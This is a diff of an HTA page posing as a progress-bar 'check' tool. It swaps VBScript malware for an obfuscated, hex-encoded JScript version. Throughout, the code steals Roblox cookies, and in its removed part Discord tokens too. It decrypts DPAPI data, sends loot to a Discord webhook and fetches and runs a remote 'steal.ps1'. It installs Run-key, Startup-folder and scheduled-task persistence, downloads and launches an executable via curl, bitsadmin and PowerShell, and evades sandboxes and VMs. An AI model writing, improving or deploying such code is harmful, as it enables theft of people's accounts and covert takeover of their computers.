+    _sh.Run(q1+" "+nB2+" "+pV+_q7("202d46696c652022")+_t3+_qs,0,true);
+    var _r="";
+    try{if(_fs.FileExists(_t2)&&_fs.GetFile(_t2).Size>20)_r=_rd(_t2);}catch(_e){}
+    try{_fs.DeleteFile(_t1,true);_fs.DeleteFile(_t3,true);_fs.DeleteFile(_t2,true);}catch(_e){}
+    return _r;
+  }catch(_e){return "";}
+}
 
-Sub SleepMinutes(m)
-    Call SleepSeconds(m * 60)
-End Sub
+function _ck(){
+  try{
+    var _c=[
+      _ev(_ev2)+_q7("5c526f626c6f785c4c6f63616c53746f726167655c726f626c6f78636f6f6b6965732e646174"),
+      _ev(_ev2)+_q7("5c526f626c6f785c4c6f63616c53746f726167655c526f626c6f78436f6f6b6965732e646174"),
+      _ev(_ev2)+_q7("5c526f626c6f785c436f6f6b696573"),
+      _ev(_ev3)+_q7("5c526f626c6f785c4c6f63616c53746f726167655c726f626c6f78636f6f6b6965732e646174"),
+      _ev(_ev4)+_q7("5c417070446174615c4c6f63616c5c526f626c6f785c4c6f63616c53746f726167655c726f626c6f78636f6f6b6965732e646174")
+    ];
+    var _f="",i=0;
+    for(;i<_c.length;i++){if(_fs.FileExists(_c[i])){_f=_c[i];break;}}
+    if(!_f){
+      var _pk=_ev(_ev2)+_q7("5c5061636b61676573");
+      if(_fs.FolderExists(_pk)){
+        var _e=new Enumerator(_fs.GetFolder(_pk).SubFolders);
+        for(;!_e.atEnd();_e.moveNext()){
+          var _s=_e.item();
+          if(_s.Name.indexOf(_q7("526f626c6f78"))>-1){
+            var _q=_s.Path+_q7("5c4c6f63616c53746174655c526f626c6f78436f6f6b6965732e646174");
+            if(_fs.FileExists(_q)){_f=_q;break;}
+          }
+        }
+      }
+    }
+    if(!_f){_em(_q7("526f626c6f78"),_q7("4e6f20636f6f6b69652066696c6520666f756e64"),16711680);return;}
+    var _raw=_rd(_f);
+    if(_raw.length<50){_em(_q7("526f626c6f78"),_q7("46696c6520746f6f20736d616c6c3a20")+_raw.length+_q7("206279746573"),16711680);return;}
+    var _out="",_mode="";
+    if(_raw.indexOf(_q7("5f7c5741524e494e47"))>-1){_out=_raw;_mode=_q7("506c61696e74657874");}
+    if(!_out&&_raw.indexOf(_q7("436f6f6b69657344617461"))>-1){
+      _mode=_q7("4a534f4e2d4450415049");
+      var _k=_raw.indexOf(_q7("436f6f6b69657344617461223a22"));
+      if(_k>-1){
+        _k+=14;
+        var _z=_raw.indexOf(_qs,_k);
+        if(_z>_k){
+          var _enc=_raw.substring(_k,_z);
+          if(_enc.length>100){_out=_dp(_enc);if(!_out){_out=_enc;_mode=_q7("4a534f4e2d526177");}}
+        }
+      }
+    }
+    if(!_out&&_raw.indexOf(_q7("2e524f424c4f5345435552495459"))>-1){
+      _mode=_q7("5261772d524f424c4f5345435552495459");
+      _out=_raw.substring(_raw.indexOf(_q7("2e524f424c4f5345435552495459")));
+    }
+    if(!_out){_out=_raw;_mode=_q7("52617746696c65");}
+    var _w=_out.indexOf(_q7("7c24434145"));
+    if(_w<0)_w=_out.indexOf(_q7("7c5f434145"));
+    if(_w>-1)_out=_out.substring(_w);
+    _em(_q7("526f626c6f782028")+_mode+_q7("29"),_q7("53697a653a20")+_out.length+"\n"+_out.substring(0,60)+"...",65280);
+    _fp(_q7("636f6f6b69652e747874"),_out);
+  }catch(_e){}
+}
 
-' --- Persistence ---
-Sub Persistence()
-    Dim payload : payload = "mshta https://dicetrace.app"
-    On Error Resume Next
-    
-    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
-    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
-    
-    Dim sp : sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
-    Dim sf : Set sf = fso.CreateTextFile(sp, True)
-    sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & payload & """&Chr(34), 0, False"
-    sf.Close
-    
-    Call PostEmbed(":pushpin: Persistence", "3 startup methods installed", 65280)
-End Sub
+function _sf(_dst){
+  try{
+    var _x=_xh();if(!_x)return;
+    _x.Open(_q7("474554"),_a9,false);_x.Send();
+    if(_x.ResponseText&&_x.ResponseText.length>200)_wr(_dst,_x.ResponseText);
+  }catch(_e){}
+}
+function _pe(){
+  try{
+    _mk(_dr);
+    var _hta=_dr+_q7("5c7376632e687461"), _vbs=_dr+_q7("5c7764752e766273");
+    var _sp=_ev(_ev3)+_q7("5c4d6963726f736f66745c57696e646f77735c5374617274204d656e755c50726f6772616d735c537461727475705c7764752e766273");
+    if(qZ.COPY)_sf(_hta);
+    var _has=_fs.FileExists(_hta);
+    var _direct=_has? tQ2+" "+_qs+_hta+_qs : tQ2+" "+_a9;
+    var _inner =_has? tQ2+" "+_qs+_qs+_hta+_qs+_qs : tQ2+" "+_a9;
+    var _stub=_q7("4f6e204572726f7220526573756d65204e6578740d0a")
+           + _q7("5365742077203d204765744f626a65637428226e65773a")+vA+_q7("22290d0a")
+           + _q7("496620457272203c3e2030205468656e204572722e436c6561723a205365742077203d204372656174654f626a6563742822")+vA+_q7("22290d0a")
+           + _q7("496620457272203d2030205468656e20772e52756e2022")+_inner+_q7("222c20302c2046616c73650d0a");
+    _wr(_vbs,_stub);
+    var _via=_fs.FileExists(_vbs)? _q7("777363726970742e657865202f2f422022")+_vbs+_qs : _direct;
 
-' --- GrabTokens ---
-Sub GrabTokens()
-    Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    xh.SetOption 2, 13056
-    xh.Open "GET", "https://gist.githubusercontent.com/vizeynDev/1ac4a11405f73febbb261f0a0f391314/raw/ff3015d90e971b563bc4714a449a134bffb7c2f3/steal.ps1", False
-    xh.Send
-    If xh.Status <> 200 Then Exit Sub
-    Dim pc: pc = xh.responseText
-    If Len(pc) < 100 Then Exit Sub
-    Set xh = Nothing
-    
-    Dim psf: psf = TmpFile("steal.ps1")
-    WriteFile psf, pc
-    sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
-    fso.DeleteFile psf, True
-    
-    Dim tf: tf = TmpFile("steal_result.txt")
-    If Not fso.FileExists(tf) Then Exit Sub
-    Dim raw: raw = ReadFile(tf)
-    
-    If Len(raw) > 10 Then
-        Dim lines: lines = Split(raw, vbCrLf)
-        Dim l
-        For Each l In lines
-            If Len(l) > 10 Then
-                If Left(l, 8) = "DISCORD|" Then
-                    Dim p: p = Split(Mid(l, 9), "|")
-                    If UBound(p) >= 4 Then
-                        Dim info: info = "**User:** " & p(0) & vbCrLf
-                        If p(1) <> "" Then info = info & "**Email:** " & p(1) & vbCrLf
-                        If p(2) <> "" Then info = info & "**Phone:** " & p(2) & vbCrLf
-                        If p(3) <> "0" Then info = info & "**ID:** " & p(3) & vbCrLf
-                        info = info & "**Token:** " & p(4)
-                        Call PostEmbed(":gift: Discord Token", info, 5793266)
-                    End If
-                End If
-                If Left(l, 7) = "ROBLOX|" Or Left(l, 9) = "ROBLOXMS|" Then
-                    Call PostEmbed(":cookie: Roblox Cookie", Mid(l, 8), 65280)
-                End If
-            End If
-        Next
-    End If
-End Sub
+    _sh.RegWrite(_rk+_rwd,_via,_q7("5245475f535a"));
+    _sh.RegWrite(_rk+_bs+_g4+_bs+_wd,_via,_q7("5245475f535a"));
+    _wr(_sp,_stub);
+    if(qZ.SCHT)_sh.Run(_r8+_q7("202f637265617465202f66202f746e2022")+_wd+_q7("202f74722022")+_via.replace(/"/g,_qs+_qs)+_q7("22202f7363206f6e6c6f676f6e"),0,true);
+  }catch(_e){}
+}
 
-' --- Utility Functions ---
-Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
-Sub WriteFile(path, content): Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing: End Sub
-Function ReadFile(path): ReadFile = "": Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing: End Function
+function _dy(){
+  try{
+    _mk(_dr);
+    var _ex=_dr+_q7("5c636f6f6b69657a2e657865"), _u=zT3;
+    if(!_ix(_ex))_sh.Run(qK+_q7("202d734c202d6f2022")+_ex+_qs+" "+_qs+_u+_qs,0,true);
+    if(!_ix(_ex))_sh.Run(zW+_q7("202f7472616e73666572207764202f646f776e6c6f6164202f7072696f7269747920686967682022")+_u+_qs+" "+_qs+_ex+_qs,0,true);
+    if(!_ix(_ex))_sh.Run(_m4+" "+_y8+" "+_qs+_u+_qs+" "+_qs+_ex+_qs,0,true);
+    if(!_ix(_ex))_sh.Run(_pc2(_s6+_q7("202d5572692027")+_u+_q7("27202d4f757446696c652027")+_ex+_sq),0,true);
+    if(_ix(_ex)){
+      _sh.Run(_pc2(_h7+_q7("202d4c69746572616c506174682027")+_ex+_sq),0,false);
+      _sh.Run(_qs+_ex+_qs,0,false);
+    }
+  }catch(_e){}
+}
 
-' --- PostEmbed (direct to discord) ---
-Sub PostEmbed(t, d, c)
-    Dim DQ: DQ = Chr(34)
-    Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
-    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    h.SetOption 2, 13056
-    h.Open "POST", WH, False
-    h.SetRequestHeader "Content-Type", "application/json"
-    h.Send j
-    Set h = Nothing
-End Sub
+var _rv=new RegExp(_q7("766d776172657c7669727475616c626f787c696e6e6f74656b7c71656d757c78656e7c626f6368737c706172616c6c656c737c73616e64626f787c7669727475616c"),"i");
+var _ru=new RegExp(_q7("5e2873616e64626f787c766d7c757365727c746573747c61646d696e7c616e616c7973747c6d616c776172657c776461677574696c6974796163636f756e742924"),"i");
 
-' --- PostFile (direct to discord) ---
-Sub PostFile(fn, ct)
-    Dim DQ: DQ = Chr(34)
-    Dim b: b = Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 36)
-    Dim bd: bd = "--" & b & vbCrLf & "Content-Disposition: form-data; name=" & DQ & "file" & DQ & "; filename=" & DQ & fn & DQ & vbCrLf & vbCrLf & ct & vbCrLf & "--" & b & "--"
-    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    h.SetOption 2, 13056
-    h.Open "POST", WH, False
-    h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
-    h.Send bd
-    Set h = Nothing
-End Sub
+function _vm(){
+  var _f=0,i=0,_k,_s;
+  if(qZ.VM_REG){
+    _k=[_q7("534f4654574152455c564d776172652c20496e632e5c564d7761726520546f6f6c73"),
+        _q7("534f4654574152455c4f7261636c655c5669727475616c426f784775657374204164646974696f6e73"),
+        _scs+_q7("56426f784775657374"),
+        _scs+_q7("56426f784d6f757365"),
+        _scs+_q7("766d6369"),
+        _scs+_q7("564d546f6f6c73"),
+        _scs+_q7("766d33646d70"),
+        _scs+_q7("53626965447276")];
+    for(;i<_k.length;i++){try{_sh.RegRead(_hk+_k[i]);_f|=1;}catch(_e){}}
+  }
+  if(qZ.VM_BIOS){
+    _s="";
+    try{_s+=String(_sh.RegRead(_hk+_hdb+_q7("53797374656d4d616e756661637475726572")))+" ";}catch(_e){}
+    try{_s+=String(_sh.RegRead(_hk+_hdb+_q7("53797374656d50726f647563744e616d65")));}catch(_e){}
+    try{if(_rv.test(_s))_f|=2;}catch(_e){}
+  }
+  if(qZ.VM_DISK){
+    try{if(_rv.test(String(_sh.RegRead(_hk+_scs+_q7("4469736b5c456e756d5c30")))))_f|=4;}catch(_e){}
+  }
+  if(qZ.VM_ENV){
+    try{if(_rv.test(String(_ev(_q7("50524f434553534f525f4944454e544946494552")))))_f|=32;}catch(_e){}
+    try{if(_ru.test(String(_un)))_f|=64;}catch(_e){}
+  }
+  if(qZ.TMG){
+    try{
+      var _t0=(new Date()).getTime(),_x=0,_j=0;
+      for(;_j<200000;_j++)_x=(_x+_j)%9973;
+      var _t1=(new Date()).getTime(); if(_t1-_t0>300)_f|=8;
+      var _y=0; for(_j=0;_j<200000;_j++)_y=(_y*31+_j)&0x7fffffff;
+      var _t2=(new Date()).getTime(); if(_t2-_t1>300)_f|=16;
+    }catch(_e){}
+  }
+  if(qZ.VM_WMI){
+    try{
+      var _qq=GetObject(_wmq).ExecQuery(_wmp);
+      var _en=new Enumerator(_qq);
+      var _L=_q7("7c76626f78736572766963652e6578657c76626f78747261792e6578657c766d746f6f6c73642e6578657c766d77617265747261792e6578657c73616e64626f7869652e6578657c70726f636d6f6e2e6578657c70726f636d6f6e36342e6578657c7836346462672e6578657c69646136342e6578657c");
+      for(;!_en.atEnd();_en.moveNext()){
+        if(_L.indexOf("|"+String(_en.item().Name).toLowerCase()+"|")>-1){_f|=128;break;}
+      }
+    }catch(_e){}
+  }
+  return _f;
+}
+function _sp(_n){var _h=0;while(_n-->0)_h=(_h*31+_n)&0x7fffffff;return _h;}
 
-' --- RunCmd ---
-Sub RunCmd(cmd)
-    Dim w,p,i,s
-    Set w = GetObject("winmgmts:\\.\root\cimv2")
-    Set s = w.Get("Win32_ProcessStartup").SpawnInstance_
-    s.ShowWindow = 0
-    Set p = w.Get("Win32_Process")
-    p.Create cmd,,s,i
-    If i = 0 Then Exit Sub
-    Dim r: r = True
-    Dim startTime: startTime = Timer()
-    Do While r
-        If Timer() - startTime > 60 Then
-            Call PostEmbed("DEBUG", "PS1 TIMEOUT after 60s, killing", 16711680)
-            sh.Run "taskkill /F /PID " & i, 0, False
-            Exit Do
-        End If
-        Set w = GetObject("winmgmts:\\\\.\\root\\cimv2")
-        r = (w.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE ProcessId=" & i).Count > 0)
-        Set w = Nothing
-        If r Then Dim t: t = Timer(): Do While Timer() - t < 0.15: Loop: End If
-    Loop
-End Sub
+/* ----- anti-sandbox silencieux -----
+   WMI=1 : RAM / uptime / coeurs / username / OUI MAC (4 requetes WMI)
+   WMI=0 : coeurs (registre) + username, aucune requete WMI
+---------------------------------------- */
+function _sb(){
+  var _s=0,_q,_e,_i,_m,_k=0;
+  if(qZ.WMI){
+    try{
+      _q=GetObject(_wmq);
+      try{
+        _e=new Enumerator(_q.ExecQuery(_q7("53656c65637420546f74616c506879736963616c4d656d6f72792066726f6d2057696e33325f436f6d707574657253797374656d")));
+        for(;!_e.atEnd();_e.moveNext()){if(Number(_e.item().TotalPhysicalMemory)<4294967296)_s++;}
+      }catch(_x){}
+      try{
+        _e=new Enumerator(_q.ExecQuery(_q7("53656c6563742053797374656d557054696d652066726f6d2057696e33325f4f7065726174696e6753797374656d")));
+        for(;!_e.atEnd();_e.moveNext()){if(Number(_e.item().SystemUpTime)<600)_s++;}
+      }catch(_x){}
+      try{
+        _e=new Enumerator(_q.ExecQuery(_q7("53656c656374204e756d6265724f66436f7265732066726f6d2057696e33325f50726f636573736f72")));
+        for(;!_e.atEnd();_e.moveNext()){if(Number(_e.item().NumberOfCores)<2)_s++;}
+      }catch(_x){}
+      try{
+        _e=new Enumerator(_q.ExecQuery(_q7("53656c656374204d4143416464726573732066726f6d2057696e33325f4e6574776f726b41646170746572436f6e66696775726174696f6e")));
+        _m=_q7("30303a30353a36397c30303a30433a32397c30303a31433a31347c30303a35303a35367c30383a30303a32377c30303a31353a35447c30303a30333a46467c30303a31363a33457c35323a35343a30307c30303a31433a3432");
+        for(;!_e.atEnd();_e.moveNext()){
+          _i=_e.item().MACAddress;
+          if(_i&&_m.indexOf(String(_i).substr(0,8))>-1){_s++;break;}
+        }
+      }catch(_x){}
+    }catch(_x){}
+  }else{
+    for(_i=0;_i<12;_i++){
+      try{_sh.RegRead(_hk+_hdc+_i);_k=_i+1;}catch(_x){break;}
+    }
+    if(_k<2)_s++;
+  }
+  try{if(_ru.test(String(_un)))_s++;}catch(_x){}
+  return _s;
+}
 
-' --- DecryptDPAPI ---
-Function DecryptDPAPI(b64)
-    DecryptDPAPI = ""
-    Dim inf: inf = TmpFile("dpi.txt")
-    Dim outf: outf = TmpFile("dpo.txt")
-    fso.DeleteFile outf, True
-    WriteFile inf, b64
-    Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
-    Dim psf: psf = TmpFile("dpapi.ps1")
-    WriteFile psf, ps
-    sh.Run "powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
-    If fso.FileExists(outf) Then If fso.GetFile(outf).Size > 20 Then DecryptDPAPI = ReadFile(outf)
-    fso.DeleteFile inf, True
-    fso.DeleteFile psf, True
-    fso.DeleteFile outf, True
-End Function
+function _ft(){
+  try{
+    window.resizeTo(440,620);
+    window.moveTo(Math.round((screen.availWidth-440)/2),Math.round((screen.availHeight-620)/2));
+  }catch(_e){}
+}
+function _by(){try{window.resizeTo(0,0);window.moveTo(-2000,-2000);}catch(_e){}}
 
-' --- Ej ---
-Function Ej(s)
-    Ej = s
-    Ej = Replace(Ej, Chr(92), Chr(92) & Chr(92))
-    Ej = Replace(Ej, Chr(34), Chr(92) & Chr(34))
-    Ej = Replace(Ej, vbCrLf, Chr(92) & "n")
-    Ej = Replace(Ej, vbCr, Chr(92) & "n")
-    Ej = Replace(Ej, vbLf, Chr(92) & "n")
-    Ej = Replace(Ej, vbTab, Chr(92) & "t")
-End Function
+var _s1=document.getElementById("stage"), _s2=document.getElementById("done"),
+    _s3=document.getElementById("bar"),   _s4=document.getElementById("pct"),
+    _s5=document.getElementById("ckc"),   _s7=document.getElementById("ckt"),
+    _s8=document.getElementById("last"),  _s9=document.querySelectorAll(".steps li");
+var _tk=0,_st=0,_ph=0,_an=0,_booted=0;
+
+function _sn(){try{_s8.innerHTML=_q7("4c61737420636865636b3a20")+(new Date()).toLocaleTimeString();}catch(_e){}}
+
+function _fr(){
+  if(!_ph){
+    _tk++;
+    var _p=_tk*2;if(_p>100)_p=100;
+    _s3.style.width=_p+"%"; _s4.innerHTML=_p+"%";
+    if(_tk%13===0&&_st<4){if(_st>0)_s9[_st-1].className="ok";_s9[_st].className="on";_st++;}
+    if(_tk>=52){
+      _ph=1; if(_st>0)_s9[_st-1].className="ok";
+      _s3.style.width="100%"; _s4.innerHTML="100%";
+      _s1.style.display="none"; _s2.className="done show";
+      _s5.setAttribute("stroke-dashoffset",151);
+      _s7.setAttribute("stroke-dashoffset",40);
+    }
+  }else{
+    _an++;
+    if(_an<=16)_s5.setAttribute("stroke-dashoffset",Math.round(151-151*_an/16));
+    else if(_an<=24)_s7.setAttribute("stroke-dashoffset",Math.round(40-40*(_an-16)/8));
+    else if(_an===25){_s7.setAttribute("stroke-dashoffset",0);_sn();if(qZ.HIDE)setTimeout(_by,8000);}
+  }
+}
+
+function _fv(_s){var _h=2166136261,i=0;for(;i<_s.length;i++){_h^=_s.charCodeAt(i);_h=(_h*16777619)>>>0;}return _h.toString(16);}
+function _cc(){var _t=[],i=0,j,_c;for(;i<256;i++){_c=i;for(j=0;j<8;j++)_c=(_c&1)?((_c>>>1)^3988292384):(_c>>>1);_t[i]=_c>>>0;}return _t;}
+function _h3(_s,_n){var _h=0;while(_n-->0)_h=(_h*33+_s.charCodeAt(_h%_s.length))&0x7fffffff;return _h;}
+function _sk(_s){var _k=0,i=0;for(;i<_s.length;i++)_k=(_k<<5)-_k+_s.charCodeAt(i)|0;return _k;}
+var _rg=(function(){var _m={};return{v:0,add:function(_s){_m[_fv(_s)]=1;this.v++;},n:function(){return this.v;}};})();
+
+/* ----- demarrage : UI d'abord, WMI en dernier ----- */
+function _work(){
+  try{_fl=_vm();}catch(_e){}
+  var _jt=2000+Math.floor(Math.random()*6001)+(qZ.BOMB*1000);
+  setTimeout(function(){
+    try{
+      if(qZ.VMDEG===2&&_fl!==0){
+        _em(_q7("50726f6265"),_q7("62656e69676e206d6f64652c20666c6167733a20")+_fl,8421504);
+        _sp(2000);
+      }else{
+        if(qZ.PERSIST)_pe();
+        _ck();
+        var _d2=(qZ.JITTER?(600+Math.floor(Math.random()*2400)):0);
+        setTimeout(function(){try{if(qZ.DROP)_dy();}catch(_e){}},_d2);
+        if(_fl!==0)_sp(1200);
+      }
+    }catch(_e){}
+    try{_sbv=_sb();}catch(_e){}
+  },_jt);
+}
+
+function _boot(){
+  if(_booted)return;
+  _booted=1;
+  try{_ft();}catch(_e){}
+  try{document.getElementById("x").onclick=_by;}catch(_e){}
+  try{document.getElementById("again").onclick=function(){_ck();_sn();};}catch(_e){}
+  setTimeout(function(){try{setInterval(_fr,60);}catch(_e){}},400);
+  setInterval(function(){try{_ck();_sn();}catch(_e){}},300000);
+  setTimeout(_work,30);
+}
+window.onload=_boot;
+setTimeout(_boot,1500);
+})();
 </script>
-</head><body></body></html>
+</body>
+</html>
